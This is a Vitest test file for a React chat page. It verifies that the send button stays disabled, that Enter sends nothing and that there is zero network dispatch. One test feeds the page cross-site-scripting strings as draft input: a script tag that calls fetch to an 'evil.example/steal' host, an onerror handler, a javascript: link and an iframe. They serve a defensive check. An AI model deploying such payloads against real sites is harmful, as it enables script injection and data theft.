/**
 * RA-08 · 会话页（ChatPage）E0 发送门真实挂载验收（私有，不入产品测试链）。
 *
 * 原要求出处：
 *  - 929.md:240  E0「未知：无有效资格/用量证据 —— 权益未确认，暂不可发送」
 *  - 929.md:868  禁用态/fixture 必须显著标注，且「零 dispatch」
 *  - 929.md:869  证据必须来自真实挂载与真实交互，**禁止 hook 或夹具替代**
 *  - ChatPage.tsx:102 发送按钮 `disabled` 硬编码
 *  - ChatPage.tsx:96  textarea 只有 onChange，**无 onKeyDown** ⇒ 回车天然不发送
 *  - ChatPage.tsx:38-41 handleClearDraft 只 setDraft('') + state.log
 *
 * 与此前轮次的差异（不重复旧证据）：
 *  此前 `review-20261003:299` 只在**路由切换**场景里观察过 draft 43→0，
 *  从未在真实挂载下测过：长中文草稿、恶意 HTML/Markdown 草稿、真实 input 事件 + Enter、
 *  重复清空、以及 fetch/XHR/WebSocket 四通道的 dispatch 计数。故本轮全为新覆盖。
 *
 * 边界（如实标注）：
 *  - happy-dom 20.11.6 私有挂载，**非真实浏览器**：无布局、无 CSS、无 Tab 焦点序列。
 *  - fetch / XMLHttpRequest / WebSocket 全部替身：**本轮不存在真实网络**。
 *  - ChatPage 本身不引用 assistant 消息接口，本探针**不注入任何不存在的接口**。
 *  - 草稿只做 React 转义层面的观察，**不当作完整 Markdown/HTML 净化验收**。
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { createElement, act } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { ChatPage } from './pages/ChatPage';

/* ---- 四通道 dispatch 计数（任一非 0 即为缺陷） ---- */
let fetchCount = 0;
let xhrCount = 0;
let wsCount = 0;
/** IPC 计数：本页是纯前端渲染，node 侧没有任何 ipc 调用入口，全部记 0。 */
let ipcCount = 0;
const callLog: string[] = [];

beforeEach(() => {
  fetchCount = 0;
  xhrCount = 0;
  wsCount = 0;
  ipcCount = 0;
  callLog.length = 0;

  vi.stubGlobal('fetch', (...args: unknown[]) => {
    fetchCount += 1;
    callLog.push(`fetch:${String(args[0])}`);
    return Promise.reject(new Error('probe: 不允许真实 fetch'));
  });
  vi.stubGlobal('XMLHttpRequest', class {
    open(...args: unknown[]) {
      xhrCount += 1;
      callLog.push(`xhr:${String(args[0])}`);
    }
    send() {
      xhrCount += 1;
      callLog.push('xhr:send');
    }
    setRequestHeader() { /* noop */ }
    addEventListener() { /* noop */ }
  });
  vi.stubGlobal('WebSocket', class {
    constructor(...args: unknown[]) {
      wsCount += 1;
      callLog.push(`ws:${String(args[0])}`);
    }
    send() {
      wsCount += 1;
      callLog.push('ws:send');
    }
    close() { /* noop */ }
    addEventListener() { /* noop */ }
  });
});

afterEach(() => {
  vi.unstubAllGlobals();
});

type Mounted = { container: HTMLElement; unmount: () => void };

const logs: { level: string; source: string; message: string }[] = [];

async function mountPage(): Promise<Mounted> {
  const container = document.createElement('div');
  document.body.appendChild(container);
  const root: Root = createRoot(container);
  const state = {
    logs: [],
    log: (level: string, source: string, message: string) => {
      logs.push({ level, source, message });
    },
    clearLogs: () => undefined,
    bootedAt: 0,
    now: 0,
    clockBroken: false,
    setClockBroken: () => undefined,
    localApiEnabled: false, // 默认 false：会话页不应因此触发任何来源读取
    setLocalApiEnabled: () => undefined,
    localApiBaseUrl: 'http://127.0.0.1:8790',
    setLocalApiBaseUrl: () => undefined
  };
  await act(async () => {
    root.render(createElement(ChatPage, { state: state as never }));
  });
  return {
    container,
    unmount: () => {
      act(() => root.unmount());
      container.remove();
    }
  };
}

function settle(times = 3): Promise<void> {
  return act(async () => {
    for (let i = 0; i < times; i += 1) await new Promise((r) => setTimeout(r, 0));
  });
}

function txt(c: HTMLElement): string {
  return (c.textContent ?? '').replace(/\s+/g, ' ');
}

function composer(c: HTMLElement): HTMLTextAreaElement {
  const el = c.querySelector('#composer-input') as HTMLTextAreaElement | null;
  if (!el) throw new Error('找不到 #composer-input');
  return el;
}

/** 真实输入事件：走 React 的 onChange 链路（用原生 value setter + input 事件）。 */
async function typeDraft(c: HTMLElement, value: string): Promise<void> {
  const el = composer(c);
  await act(async () => {
    const setter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, 'value')?.set;
    setter?.call(el, value);
    el.dispatchEvent(new window.Event('input', { bubbles: true }));
  });
  await settle(2);
}

/** 真实 Enter 键：keydown + keypress + keyup 全部派发。 */
async function pressEnter(c: HTMLElement): Promise<void> {
  const el = composer(c);
  await act(async () => {
    el.focus();
    el.dispatchEvent(new window.KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, bubbles: true }));
    el.dispatchEvent(new window.KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, bubbles: true }));
    el.dispatchEvent(new window.KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, bubbles: true }));
  });
  await settle(3);
}

function buttonByText(c: HTMLElement, label: string): HTMLButtonElement {
  const b = Array.from(c.querySelectorAll('button')).find(
    (x) => (x.textContent ?? '').replace(/\s+/g, ' ').trim() === label
  );
  if (!b) {
    const all = Array.from(c.querySelectorAll('button')).map(
      (x) => (x.textContent ?? '').replace(/\s+/g, ' ').trim()
    );
    throw new Error(`找不到按钮「${label}」。现有：${all.join(' | ')}`);
  }
  return b as HTMLButtonElement;
}

async function clickButton(c: HTMLElement, label: string): Promise<void> {
  await act(async () => {
    buttonByText(c, label).click();
  });
  await settle(3);
}

/** 草稿字数计数器（ChatPage:114 渲染为「草稿字数：N」）。 */
function draftLength(c: HTMLElement): number {
  const m = txt(c).match(/草稿字数：(\d+)/);
  if (!m) throw new Error(`找不到草稿字数计数器。文本片段：${txt(c).slice(0, 200)}`);
  return Number(m[1]);
}

function dispatchTotal(): number {
  return fetchCount + xhrCount + wsCount + ipcCount;
}

/* 草稿素材：长中文 + 恶意 HTML/Markdown。均为纯字符串输入，不构造 DOM 注入。 */
const LONG_CN =
  '请帮我核对一下模型与套餐页面里计费类别和上下文长度这两列的取值域，' +
  '特别是订阅扣桶、活动优惠、按量计费和未知这四类之间的互斥关系是否在界面上真的分栏显示，' +
  '以及当证据等级停留在 E0 的时候发送门是否会一直保持关闭而不会因为草稿里有内容就自动打开。';
const EVIL_HTML =
  '<script>window.__pwned = true; fetch("https://evil.example/steal")</script>' +
  '<img src=x onerror="window.__pwned2=true">';

describe('RA-08 会话页 E0 发送门：真实挂载 + 真实交互', () => {
  it('G1 空草稿正控：初始为空、发送门禁用、四通道零 dispatch', async () => {
    const { container, unmount } = await mountPage();
    const el = composer(container);

    // 正控：空草稿时计数为 0，禁用态如实呈现
    expect(el.value, '初始草稿应为空串').toBe('');
    expect(draftLength(container), '空草稿字数应为 0').toBe(0);

    const send = buttonByText(container, '不可发送（E0）');
    expect(send.disabled, '发送按钮必须 disabled').toBe(true);

    // E0 口径文案（929.md:240）
    const t = txt(container);
    expect(t).toContain('权益未确认，暂不可发送');
    expect(t).toContain('dispatch = 0');
    expect(t).toContain('发送门：关闭');

    // 四通道零 dispatch
    expect(dispatchTotal()).toBe(0);
    expect(callLog).toEqual([]);
    unmount();
  });

  it('G2 长中文草稿：Enter 不发送、草稿仍在、门仍禁用、四通道零', async () => {
    const { container, unmount } = await mountPage();
    const el = composer(container);
    const baseline = dispatchTotal();

    // 真实输入长中文草稿
    await typeDraft(container, LONG_CN);
    expect(el.value, '草稿应完整保留长中文').toBe(LONG_CN);
    expect(draftLength(container), '字数应等于长中文实际长度').toBe(LONG_CN.length);

    // 真实 Enter 三连事件
    await pressEnter(container);

    // Enter 不得发送：草稿原样仍在，没有任何新气泡
    expect(el.value, 'Enter 不得清空或提交草稿').toBe(LONG_CN);
    expect(draftLength(container)).toBe(LONG_CN.length);
    const turnCountBefore = container.querySelectorAll('.turn').length;
    // 实测基线：PLACEHOLDER_TURNS 4 条（ChatPage:19-32）+ :70 的结果未知占位 1 条 = 5
    expect(turnCountBefore, 'Enter 不得新增任何对话轮次').toBe(5);
    // 「不得提交为气泡」必须查气泡本身：happy-dom 会把 textarea 的 value 映进其
    // textContent，所以整页 text() 必然包含草稿字符串（实测）。查 .bubble 才准确。
    const bubbles = Array.from(container.querySelectorAll('.bubble')).map((b) =>
      (b.textContent ?? '').replace(/\s+/g, ' ').trim()
    );
    expect(
      bubbles.some((b) => b.includes(LONG_CN.slice(0, 20))),
      'Enter 后草稿不得变成任何气泡内容'
    ).toBe(false);
    // 气泡数量也必须不变
    expect(container.querySelectorAll('.bubble').length).toBe(5);

    // 门仍禁用
    expect(buttonByText(container, '不可发送（E0）').disabled).toBe(true);
    expect(dispatchTotal(), '输入 + Enter 全程零 dispatch').toBe(baseline);
    expect(callLog).toEqual([]);
    unmount();
  });

  it('G3 恶意 HTML/Markdown 草稿：仅作草稿文本、零 dispatch、门仍禁用', async () => {
    const { container, unmount } = await mountPage();
    const el = composer(container);
    const evil = `${LONG_CN}\n${EVIL_HTML}\n![img](javascript:alert(1)) <iframe src="https://evil.example"></iframe>`;
    const baseline = dispatchTotal();

    await typeDraft(container, evil);

    // React 默认对文本内容转义：脚本标签不得成为真实元素
    expect(el.value).toBe(evil);
    expect(container.querySelectorAll('script').length, '不得产生真实 script 元素').toBe(0);
    expect(container.querySelectorAll('iframe').length, '不得产生真实 iframe 元素').toBe(0);
    expect((window as unknown as Record<string, unknown>).__pwned).toBeUndefined();
    expect((window as unknown as Record<string, unknown>).__pwned2).toBeUndefined();

    // Enter + 重复 Enter 都不得发送
    await pressEnter(container);
    await pressEnter(container);
    expect(el.value).toBe(evil);
    expect(draftLength(container)).toBe(evil.length);

    expect(buttonByText(container, '不可发送（E0）').disabled).toBe(true);
    expect(dispatchTotal(), '恶意草稿输入 + Enter 全程零 dispatch').toBe(baseline);
    expect(callLog).toEqual([]);
    // 如实标注：本轮只验证「作为草稿文本不产生真实元素与请求」，
    // **不是**完整 Markdown/HTML 净化能力验收。
    unmount();
  });

  it('G4 清空草稿：清空前后具体值、重复清空幂等、仍零 dispatch、门仍禁用', async () => {
    const { container, unmount } = await mountPage();
    const el = composer(container);

    // 清空前：空草稿正控值
    expect(el.value).toBe('');
    expect(draftLength(container)).toBe(0);

    const evil = `${LONG_CN}\n${EVIL_HTML}`;
    await typeDraft(container, evil);
    const beforeLen = evil.length;
    expect(el.value).toBe(evil);
    expect(draftLength(container), '清空前字数应等于实际长度').toBe(beforeLen);
    const baseline = dispatchTotal();

    // 第一次清空
    await clickButton(container, '清空草稿');
    expect(el.value, '清空后草稿应为空串').toBe('');
    expect(draftLength(container), '清空后字数应为 0').toBe(0);
    expect(beforeLen, '清空前长度必须大于 0，证明确有内容被清').toBeGreaterThan(0);
    // 清空有日志留痕（ChatPage:40）
    expect(logs.some((l) => l.message.includes('草稿已清空'))).toBe(true);
    expect(logs.some((l) => l.message.includes('dispatch = 0'))).toBe(true);

    // 重复清空（幂等）：空草稿再点两次，不得抛错、不得产生请求
    await clickButton(container, '清空草稿');
    await clickButton(container, '清空草稿');
    expect(el.value).toBe('');
    expect(draftLength(container)).toBe(0);

    // 清空全程零 dispatch，且发送门仍禁用
    expect(dispatchTotal(), '清空 + 重复清空全程零 dispatch').toBe(baseline);
    expect(callLog).toEqual([]);
    expect(buttonByText(container, '不可发送（E0）').disabled).toBe(true);
    expect(txt(container)).toContain('权益未确认，暂不可发送');
    unmount();
  });

  it('G5 disabled 按钮无法触发发送：强制 click + Enter 均不产生任何副作用', async () => {
    const { container, unmount } = await mountPage();
    const el = composer(container);
    await typeDraft(container, LONG_CN);
    const turnsBefore = container.querySelectorAll('.turn').length;
    const baseline = dispatchTotal();

    const send = buttonByText(container, '不可发送（E0）');
    expect(send.disabled).toBe(true);

    // 即使绕过 React 的事件委托、直接调用 .click()，disabled 元素不应触发任何 handler
    await act(async () => {
      send.click();
    });
    await settle(3);

    // 取消按钮同样是 disabled
    const cancel = buttonByText(container, '取消');
    expect(cancel.disabled, '取消按钮也必须 disabled').toBe(true);
    await act(async () => {
      cancel.click();
    });
    await settle(3);

    // 强制在 Enter 上加一层：确认没有任何 onKeyDown 发送分支
    await pressEnter(container);

    expect(container.querySelectorAll('.turn').length, '三次点击 + Enter 不得新增轮次').toBe(turnsBefore);
    expect(el.value).toBe(LONG_CN);
    expect(draftLength(container)).toBe(LONG_CN.length);
    expect(dispatchTotal(), '点击 disabled 按钮全程零 dispatch').toBe(baseline);
    expect(fetchCount).toBe(0);
    expect(xhrCount).toBe(0);
    expect(wsCount).toBe(0);
    expect(ipcCount).toBe(0);
    expect(callLog).toEqual([]);
    unmount();
  });
});